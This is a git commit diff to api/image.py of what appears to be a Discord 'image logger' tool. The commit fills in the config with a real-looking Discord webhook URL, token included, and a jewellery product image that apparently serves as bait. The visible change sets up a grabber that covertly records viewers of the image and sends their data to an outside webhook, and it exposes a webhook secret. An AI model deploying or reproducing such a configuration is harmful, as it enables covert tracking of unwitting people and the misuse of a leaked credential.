da92a75ce90ec3cd8e58a70b2b21f3b902a3bff1
Aryan Pahade <155085495+AkitooSama@users.noreply.github.com>
2025-02-03 04:57:28 +0530

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335753033769811978/z20nzsrpM7mt52aaqfwQVXwhXyaH3UxZfPjfp194oBhK9MVlmXrSx8LSiEVrM7tEtMkK",
+    "image": "https://www.chidambaramgoldcovering.com/image/cache/catalog/ChidambaramGoldCovering/pendants/smdr2051-new-Heart-desingnl-pendant-for-married-women-shop-online-1t-425x500.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
